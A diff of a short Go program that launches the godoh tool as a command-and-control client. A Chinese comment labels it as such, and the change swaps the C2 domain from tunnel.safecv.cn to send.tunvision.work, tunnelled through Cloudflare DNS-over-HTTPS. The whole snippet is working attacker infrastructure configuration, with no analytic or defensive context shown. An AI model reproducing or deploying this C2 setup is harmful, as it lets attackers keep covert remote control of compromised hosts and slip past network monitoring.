@@ -11,7 +11,7 @@ import (
 
 func main() {
 	// 创建godoh c2客户端
-	p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "tunnel.safecv.cn", "-p", "cloudflare")
+	p, err := child.CreateChildProcess(`godoh`, "c2", "-d", "send.tunvision.work", "-p", "cloudflare")
 	if err != nil {
 		panic(err)
 	}
